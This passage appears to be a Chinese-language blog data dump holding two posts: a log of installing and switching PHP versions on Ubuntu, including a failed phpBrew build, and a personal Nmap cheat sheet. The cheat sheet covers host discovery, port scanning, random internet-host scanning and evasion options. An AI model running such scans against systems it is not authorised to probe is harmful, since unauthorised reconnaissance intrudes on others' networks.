使用phpBrew安装/切换PHP版本【失败】\n[https://github.com/phpbrew/phpbrew](https://github.com/phpbrew/phpbrew)\n\n```\n$ sudo apt-get update\n$ sudo apt-get install  php7.0 php7.0-cli php7.0-dev php7.0-curl php7.0-json php7.0-cgi php-pear autoconf automake curl build-essential openssl libssl-dev libcurl4-openssl-dev libxslt1-dev re2c libxml2 libxml2-dev bison libbz2-dev libreadline-dev libmhash2 libmhash-dev libmcrypt4 libmcrypt-dev\n\n# openssl成功安装的\n$ pkg-config --list-all | grep openssl\nopenssl              OpenSSL - Secure Sockets Layer and cryptography libraries and tools\n\n$ phpbrew install 5.5.38    # 出错！！！！\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's libraries\n\n----------------------\n\n$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's <evp.h>\n\n$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl --with-openssl-dir=/usr/include/openssl/\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's <evp.h>\n```\n\n>   各种无言以对，花了两整天时间，无法解决！","source":"_posts/PHP多版本安装与切换(Ubuntu-16-04-LTS).md","raw":"---\ntitle: PHP多版本安装与切换(Ubuntu-16-04-LTS)\ndate: 2017-07-26 09:06:16\ntags: PHP\n---\n>   打算使用phpBrew来进行PHP版本管理，然而phpBrew的使用需要在Ubuntu 16上默认安装的PHP版本为5，却无法直接apt-get install php5，所以打算基于php7尝试使用。\n>   结果很悲剧，疑似pkg-config出问题了。 所以本文主要做一个记录，祭奠浪费掉的两整天时间。最后憋屈的使用PHPstudy了。 /(ㄒoㄒ)/~~\n\n## PPA安装PHP\n### - 安装PHP 5.6\n```\n$ sudo apt-get install software-properties-common   # 安装PPA工具\n$ sudo add-apt-repository ppa:ondrej/php            # ondrej这个哥们维护在launchpad上的\n$ sudo apt-get update\n$ sudo apt-get install -y php5.6\n```\n### - 安装PHP 7.1\n```\n$ sudo apt-get install python-software-properties\n$ sudo add-apt-repository ppa:ondrej/php\n$ sudo apt-get update\n$ sudo apt-get install -y php7.1                    \n```\n\n## PHP版本切换\n### PHP 5.6 => PHP 7.1\n```\nApache:-\n$ sudo a2dismod php5.6\n$ sudo a2enmod php7.1\n$ sudo service apache2 restart\n\nCLI:-\n$ update-alternatives --set php /usr/bin/php7.1\n```\n### PHP 7.1 => PHP 5.6\n```\nApache:-\n$ sudo a2dismod php7.1\n$ sudo a2enmod php5.6\n$ sudo service apache2 restart\n\nCLI:-\n$ sudo update-alternatives --set php /usr/bin/php5.6\n```\n## 使用phpBrew安装/切换PHP版本【失败】\n[https://github.com/phpbrew/phpbrew](https://github.com/phpbrew/phpbrew)\n\n```\n$ sudo apt-get update\n$ sudo apt-get install  php7.0 php7.0-cli php7.0-dev php7.0-curl php7.0-json php7.0-cgi php-pear autoconf automake curl build-essential openssl libssl-dev libcurl4-openssl-dev libxslt1-dev re2c libxml2 libxml2-dev bison libbz2-dev libreadline-dev libmhash2 libmhash-dev libmcrypt4 libmcrypt-dev\n\n# openssl成功安装的\n$ pkg-config --list-all | grep openssl\nopenssl              OpenSSL - Secure Sockets Layer and cryptography libraries and tools\n\n$ phpbrew install 5.5.38    # 出错！！！！\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's libraries\n\n----------------------\n\n$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's <evp.h>\n\n$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl --with-openssl-dir=/usr/include/openssl/\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's <evp.h>\n```\n\n>   各种无言以对，花了两整天时间，无法解决！","slug":"PHP多版本安装与切换(Ubuntu-16-04-LTS)","published":1,"updated":"2017-07-26T23:56:40.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj5lo6hs80002vquvnxy7jd8c","content":"<blockquote>\n<p>  打算使用phpBrew来进行PHP版本管理，然而phpBrew的使用需要在Ubuntu 16上默认安装的PHP版本为5，却无法直接apt-get install php5，所以打算基于php7尝试使用。<br>  结果很悲剧，疑似pkg-config出问题了。 所以本文主要做一个记录，祭奠浪费掉的两整天时间。最后憋屈的使用PHPstudy了。 /(ㄒoㄒ)/~~</p>\n</blockquote>\n<h2 id=\"PPA安装PHP\"><a href=\"#PPA安装PHP\" class=\"headerlink\" title=\"PPA安装PHP\"></a>PPA安装PHP</h2><h3 id=\"安装PHP-5-6\"><a href=\"#安装PHP-5-6\" class=\"headerlink\" title=\"- 安装PHP 5.6\"></a>- 安装PHP 5.6</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get install software-properties-common   # 安装PPA工具</div><div class=\"line\">$ sudo add-apt-repository ppa:ondrej/php            # ondrej这个哥们维护在launchpad上的</div><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install -y php5.6</div></pre></td></tr></table></figure>\n<h3 id=\"安装PHP-7-1\"><a href=\"#安装PHP-7-1\" class=\"headerlink\" title=\"- 安装PHP 7.1\"></a>- 安装PHP 7.1</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get install python-software-properties</div><div class=\"line\">$ sudo add-apt-repository ppa:ondrej/php</div><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install -y php7.1</div></pre></td></tr></table></figure>\n<h2 id=\"PHP版本切换\"><a href=\"#PHP版本切换\" class=\"headerlink\" title=\"PHP版本切换\"></a>PHP版本切换</h2><h3 id=\"PHP-5-6-gt-PHP-7-1\"><a href=\"#PHP-5-6-gt-PHP-7-1\" class=\"headerlink\" title=\"PHP 5.6 =&gt; PHP 7.1\"></a>PHP 5.6 =&gt; PHP 7.1</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Apache:-</div><div class=\"line\">$ sudo a2dismod php5.6</div><div class=\"line\">$ sudo a2enmod php7.1</div><div class=\"line\">$ sudo service apache2 restart</div><div class=\"line\"></div><div class=\"line\">CLI:-</div><div class=\"line\">$ update-alternatives --set php /usr/bin/php7.1</div></pre></td></tr></table></figure>\n<h3 id=\"PHP-7-1-gt-PHP-5-6\"><a href=\"#PHP-7-1-gt-PHP-5-6\" class=\"headerlink\" title=\"PHP 7.1 =&gt; PHP 5.6\"></a>PHP 7.1 =&gt; PHP 5.6</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Apache:-</div><div class=\"line\">$ sudo a2dismod php7.1</div><div class=\"line\">$ sudo a2enmod php5.6</div><div class=\"line\">$ sudo service apache2 restart</div><div class=\"line\"></div><div class=\"line\">CLI:-</div><div class=\"line\">$ sudo update-alternatives --set php /usr/bin/php5.6</div></pre></td></tr></table></figure>\n<h2 id=\"使用phpBrew安装-切换PHP版本【失败】\"><a href=\"#使用phpBrew安装-切换PHP版本【失败】\" class=\"headerlink\" title=\"使用phpBrew安装/切换PHP版本【失败】\"></a>使用phpBrew安装/切换PHP版本【失败】</h2><p><a href=\"https://github.com/phpbrew/phpbrew\" target=\"_blank\" rel=\"external\">https://github.com/phpbrew/phpbrew</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install  php7.0 php7.0-cli php7.0-dev php7.0-curl php7.0-json php7.0-cgi php-pear autoconf automake curl build-essential openssl libssl-dev libcurl4-openssl-dev libxslt1-dev re2c libxml2 libxml2-dev bison libbz2-dev libreadline-dev libmhash2 libmhash-dev libmcrypt4 libmcrypt-dev</div><div class=\"line\"></div><div class=\"line\"># openssl成功安装的</div><div class=\"line\">$ pkg-config --list-all | grep openssl</div><div class=\"line\">openssl              OpenSSL - Secure Sockets Layer and cryptography libraries and tools</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38    # 出错！！！！</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s libraries</div><div class=\"line\"></div><div class=\"line\">----------------------</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s &lt;evp.h&gt;</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl --with-openssl-dir=/usr/include/openssl/</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s &lt;evp.h&gt;</div></pre></td></tr></table></figure>\n<blockquote>\n<p>  各种无言以对，花了两整天时间，无法解决！</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>  打算使用phpBrew来进行PHP版本管理，然而phpBrew的使用需要在Ubuntu 16上默认安装的PHP版本为5，却无法直接apt-get install php5，所以打算基于php7尝试使用。<br>  结果很悲剧，疑似pkg-config出问题了。 所以本文主要做一个记录，祭奠浪费掉的两整天时间。最后憋屈的使用PHPstudy了。 /(ㄒoㄒ)/~~</p>\n</blockquote>\n<h2 id=\"PPA安装PHP\"><a href=\"#PPA安装PHP\" class=\"headerlink\" title=\"PPA安装PHP\"></a>PPA安装PHP</h2><h3 id=\"安装PHP-5-6\"><a href=\"#安装PHP-5-6\" class=\"headerlink\" title=\"- 安装PHP 5.6\"></a>- 安装PHP 5.6</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get install software-properties-common   # 安装PPA工具</div><div class=\"line\">$ sudo add-apt-repository ppa:ondrej/php            # ondrej这个哥们维护在launchpad上的</div><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install -y php5.6</div></pre></td></tr></table></figure>\n<h3 id=\"安装PHP-7-1\"><a href=\"#安装PHP-7-1\" class=\"headerlink\" title=\"- 安装PHP 7.1\"></a>- 安装PHP 7.1</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get install python-software-properties</div><div class=\"line\">$ sudo add-apt-repository ppa:ondrej/php</div><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install -y php7.1</div></pre></td></tr></table></figure>\n<h2 id=\"PHP版本切换\"><a href=\"#PHP版本切换\" class=\"headerlink\" title=\"PHP版本切换\"></a>PHP版本切换</h2><h3 id=\"PHP-5-6-gt-PHP-7-1\"><a href=\"#PHP-5-6-gt-PHP-7-1\" class=\"headerlink\" title=\"PHP 5.6 =&gt; PHP 7.1\"></a>PHP 5.6 =&gt; PHP 7.1</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Apache:-</div><div class=\"line\">$ sudo a2dismod php5.6</div><div class=\"line\">$ sudo a2enmod php7.1</div><div class=\"line\">$ sudo service apache2 restart</div><div class=\"line\"></div><div class=\"line\">CLI:-</div><div class=\"line\">$ update-alternatives --set php /usr/bin/php7.1</div></pre></td></tr></table></figure>\n<h3 id=\"PHP-7-1-gt-PHP-5-6\"><a href=\"#PHP-7-1-gt-PHP-5-6\" class=\"headerlink\" title=\"PHP 7.1 =&gt; PHP 5.6\"></a>PHP 7.1 =&gt; PHP 5.6</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">Apache:-</div><div class=\"line\">$ sudo a2dismod php7.1</div><div class=\"line\">$ sudo a2enmod php5.6</div><div class=\"line\">$ sudo service apache2 restart</div><div class=\"line\"></div><div class=\"line\">CLI:-</div><div class=\"line\">$ sudo update-alternatives --set php /usr/bin/php5.6</div></pre></td></tr></table></figure>\n<h2 id=\"使用phpBrew安装-切换PHP版本【失败】\"><a href=\"#使用phpBrew安装-切换PHP版本【失败】\" class=\"headerlink\" title=\"使用phpBrew安装/切换PHP版本【失败】\"></a>使用phpBrew安装/切换PHP版本【失败】</h2><p><a href=\"https://github.com/phpbrew/phpbrew\">https://github.com/phpbrew/phpbrew</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install  php7.0 php7.0-cli php7.0-dev php7.0-curl php7.0-json php7.0-cgi php-pear autoconf automake curl build-essential openssl libssl-dev libcurl4-openssl-dev libxslt1-dev re2c libxml2 libxml2-dev bison libbz2-dev libreadline-dev libmhash2 libmhash-dev libmcrypt4 libmcrypt-dev</div><div class=\"line\"></div><div class=\"line\"># openssl成功安装的</div><div class=\"line\">$ pkg-config --list-all | grep openssl</div><div class=\"line\">openssl              OpenSSL - Secure Sockets Layer and cryptography libraries and tools</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38    # 出错！！！！</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s libraries</div><div class=\"line\"></div><div class=\"line\">----------------------</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s &lt;evp.h&gt;</div><div class=\"line\"></div><div class=\"line\">$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl --with-openssl-dir=/usr/include/openssl/</div><div class=\"line\">    checking for pkg-config... /usr/bin/pkg-config</div><div class=\"line\">    configure: error: Cannot find OpenSSL&apos;s &lt;evp.h&gt;</div></pre></td></tr></table></figure>\n<blockquote>\n<p>  各种无言以对，花了两整天时间，无法解决！</p>\n</blockquote>\n"},{"title":"Nmap cheat sheet","date":"2017-05-07T10:47:45.000Z","_content":"http://www.91ri.org/8654.html\n## Nmap 介绍\n![功能架构图](http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG)\n\n### 四项基本功能\n<!-- more -->\n- 主机发现（Host Discovery）\n\n- 端口扫描（Port Scanning）\n\n- 版本侦测（Version Detection）\n\n- 操作系统侦测（Operating System Detection）\n\n    而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。\n\n## 基本使用\n### 主机发现\n\n\n```bash\nnmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    # 多主机地址扫描\nnmap -A -T4 host        \n# -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)\n# -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。\n\n```\n\n\n\n\n## \b常规使用\n\n```bash\nnmap IP/Hostname                    # 最基本的使用情况\nnmap host1 host2 host3 etc...       # 扫描多主机\nnmap 192.168.0.1-192.168.1.254      # 扫描IP地址段\nnmap 192.168.0.1/23                 # CIDR格式的网络地址段（与上一条命令等同）\nnmap -iL list.txt                   # \b扫描目标主机列表\nnmap -Pn host                       # \b假定目标存活\n\n\n\n```\n## 高级使用\n```bash\nnmap -A host                        # ？？？？？？？\n\n\n```\n---\n---\n---\n\n## 渗透测试中不常用(我反正没用过)\n```bash\nnmap 192.168.1.0/24 --exclude 192.168.1.11  # 排除一些主机\nnmap -iR 100                        # \b随机扫描互联网上100个主机\nnmap -Sp                            # 只ping扫描，\nnmap -PS                            # TCP SYN scan (TCP SYN ping)\nnmap -PA                            # TCP ACK scan ping\nnmap -PU                            # UDP scan  ping\nnmap -PY                            # ??? SCTP scan\b ping\nnmap -PE/PP/PM                      # ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？\nnmap -PO [protocol] host            # 指定协议ping\nnmap -PR                            # ??? ARP ping \nnmap --traceroute                   # traceroute 功能 探测网络路径\nnmap -n/-R                          # Never do DNS resolution/Always resolve [default: sometimes]\nnmap --dns-servers serv1,serv2,,,   # 指定DNS\nnmap --system-dns                   # 使用系统DNS\nnmap -sL IPs                        # 列出IPs\b的反向DNS结果\nnmap \n\n\n\n```\n## 参考资料\n[Introduction to Nmap](http://resources.infosecinstitute.com/nmap-cheat-sheet/)\n\n[Nmap从探测到漏洞利用备忘录 – Nmap简介(一)](http://www.freebuf.com/articles/network/32302.html)\n\n## #\b零散\b\b知识\n\n#### Nmap脚本引擎(NSE)\n    - 网络探测\n    - 漏洞检测\n    - 漏洞利用\n\n#### 端口状态说明\n- Open(开放的): 应用程序正在这个端口上监听连接。\n\n- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。\n\n- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。\n\n- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。\n\n- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。\n\n- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。","source":"_posts/Nmap-cheat-sheet.md","raw":"---\ntitle: Nmap cheat sheet\ndate: 2017-05-07 18:47:45\ntags:\n---\nhttp://www.91ri.org/8654.html\n## Nmap 介绍\n![功能架构图](http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG)\n\n### 四项基本功能\n<!-- more -->\n- 主机发现（Host Discovery）\n\n- 端口扫描（Port Scanning）\n\n- 版本侦测（Version Detection）\n\n- 操作系统侦测（Operating System Detection）\n\n    而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。\n\n## 基本使用\n### 主机发现\n\n\n```bash\nnmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    # 多主机地址扫描\nnmap -A -T4 host        \n# -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)\n# -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。\n\n```\n\n\n\n\n## \b常规使用\n\n```bash\nnmap IP/Hostname                    # 最基本的使用情况\nnmap host1 host2 host3 etc...       # 扫描多主机\nnmap 192.168.0.1-192.168.1.254      # 扫描IP地址段\nnmap 192.168.0.1/23                 # CIDR格式的网络地址段（与上一条命令等同）\nnmap -iL list.txt                   # \b扫描目标主机列表\nnmap -Pn host                       # \b假定目标存活\n\n\n\n```\n## 高级使用\n```bash\nnmap -A host                        # ？？？？？？？\n\n\n```\n---\n---\n---\n\n## 渗透测试中不常用(我反正没用过)\n```bash\nnmap 192.168.1.0/24 --exclude 192.168.1.11  # 排除一些主机\nnmap -iR 100                        # \b随机扫描互联网上100个主机\nnmap -Sp                            # 只ping扫描，\nnmap -PS                            # TCP SYN scan (TCP SYN ping)\nnmap -PA                            # TCP ACK scan ping\nnmap -PU                            # UDP scan  ping\nnmap -PY                            # ??? SCTP scan\b ping\nnmap -PE/PP/PM                      # ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？\nnmap -PO [protocol] host            # 指定协议ping\nnmap -PR                            # ??? ARP ping \nnmap --traceroute                   # traceroute 功能 探测网络路径\nnmap -n/-R                          # Never do DNS resolution/Always resolve [default: sometimes]\nnmap --dns-servers serv1,serv2,,,   # 指定DNS\nnmap --system-dns                   # 使用系统DNS\nnmap -sL IPs                        # 列出IPs\b的反向DNS结果\nnmap \n\n\n\n```\n## 参考资料\n[Introduction to Nmap](http://resources.infosecinstitute.com/nmap-cheat-sheet/)\n\n[Nmap从探测到漏洞利用备忘录 – Nmap简介(一)](http://www.freebuf.com/articles/network/32302.html)\n\n## #\b零散\b\b知识\n\n#### Nmap脚本引擎(NSE)\n    - 网络探测\n    - 漏洞检测\n    - 漏洞利用\n\n#### 端口状态说明\n- Open(开放的): 应用程序正在这个端口上监听连接。\n\n- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。\n\n- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。\n\n- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。\n\n- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。\n\n- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。","slug":"Nmap-cheat-sheet","published":1,"updated":"2017-06-08T13:14:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj5lo6hse0004vquvcnaya4j0","content":"<p><a href=\"http://www.91ri.org/8654.html\" target=\"_blank\" rel=\"external\">http://www.91ri.org/8654.html</a></p>\n<h2 id=\"Nmap-介绍\"><a href=\"#Nmap-介绍\" class=\"headerlink\" title=\"Nmap 介绍\"></a>Nmap 介绍</h2><p><img src=\"http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG\" alt=\"功能架构图\"></p>\n<h3 id=\"四项基本功能\"><a href=\"#四项基本功能\" class=\"headerlink\" title=\"四项基本功能\"></a>四项基本功能</h3><a id=\"more\"></a>\n<ul>\n<li><p>主机发现（Host Discovery）</p>\n</li>\n<li><p>端口扫描（Port Scanning）</p>\n</li>\n<li><p>版本侦测（Version Detection）</p>\n</li>\n<li><p>操作系统侦测（Operating System Detection）</p>\n<p>  而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。</p>\n</li>\n</ul>\n<h2 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    <span class=\"comment\"># 多主机地址扫描</span></div><div class=\"line\">nmap -A -T4 host        </div><div class=\"line\"><span class=\"comment\"># -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)</span></div><div class=\"line\"><span class=\"comment\"># -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。</span></div></pre></td></tr></table></figure>\n<h2 id=\"常规使用\"><a href=\"#常规使用\" class=\"headerlink\" title=\"\b常规使用\"></a>\b常规使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap IP/Hostname                    <span class=\"comment\"># 最基本的使用情况</span></div><div class=\"line\">nmap host1 host2 host3 etc...       <span class=\"comment\"># 扫描多主机</span></div><div class=\"line\">nmap 192.168.0.1-192.168.1.254      <span class=\"comment\"># 扫描IP地址段</span></div><div class=\"line\">nmap 192.168.0.1/23                 <span class=\"comment\"># CIDR格式的网络地址段（与上一条命令等同）</span></div><div class=\"line\">nmap -iL list.txt                   <span class=\"comment\"># \b扫描目标主机列表</span></div><div class=\"line\">nmap -Pn host                       <span class=\"comment\"># \b假定目标存活</span></div></pre></td></tr></table></figure>\n<h2 id=\"高级使用\"><a href=\"#高级使用\" class=\"headerlink\" title=\"高级使用\"></a>高级使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap -A host                        <span class=\"comment\"># ？？？？？？？</span></div></pre></td></tr></table></figure>\n<h2 id=\"—\"><a href=\"#—\" class=\"headerlink\" title=\"—\"></a>—</h2><hr>\n<h2 id=\"渗透测试中不常用-我反正没用过\"><a href=\"#渗透测试中不常用-我反正没用过\" class=\"headerlink\" title=\"渗透测试中不常用(我反正没用过)\"></a>渗透测试中不常用(我反正没用过)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap 192.168.1.0/24 --exclude 192.168.1.11  <span class=\"comment\"># 排除一些主机</span></div><div class=\"line\">nmap -iR 100                        <span class=\"comment\"># \b随机扫描互联网上100个主机</span></div><div class=\"line\">nmap -Sp                            <span class=\"comment\"># 只ping扫描，</span></div><div class=\"line\">nmap -PS                            <span class=\"comment\"># TCP SYN scan (TCP SYN ping)</span></div><div class=\"line\">nmap -PA                            <span class=\"comment\"># TCP ACK scan ping</span></div><div class=\"line\">nmap -PU                            <span class=\"comment\"># UDP scan  ping</span></div><div class=\"line\">nmap -PY                            <span class=\"comment\"># ??? SCTP scan\b ping</span></div><div class=\"line\">nmap -PE/PP/PM                      <span class=\"comment\"># ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？</span></div><div class=\"line\">nmap -PO [protocol] host            <span class=\"comment\"># 指定协议ping</span></div><div class=\"line\">nmap -PR                            <span class=\"comment\"># ??? ARP ping </span></div><div class=\"line\">nmap --traceroute                   <span class=\"comment\"># traceroute 功能 探测网络路径</span></div><div class=\"line\">nmap -n/-R                          <span class=\"comment\"># Never do DNS resolution/Always resolve [default: sometimes]</span></div><div class=\"line\">nmap --dns-servers serv1,serv2,,,   <span class=\"comment\"># 指定DNS</span></div><div class=\"line\">nmap --system-dns                   <span class=\"comment\"># 使用系统DNS</span></div><div class=\"line\">nmap <span class=\"_\">-s</span>L IPs                        <span class=\"comment\"># 列出IPs\b的反向DNS结果</span></div><div class=\"line\">nmap</div></pre></td></tr></table></figure>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p><a href=\"http://resources.infosecinstitute.com/nmap-cheat-sheet/\" target=\"_blank\" rel=\"external\">Introduction to 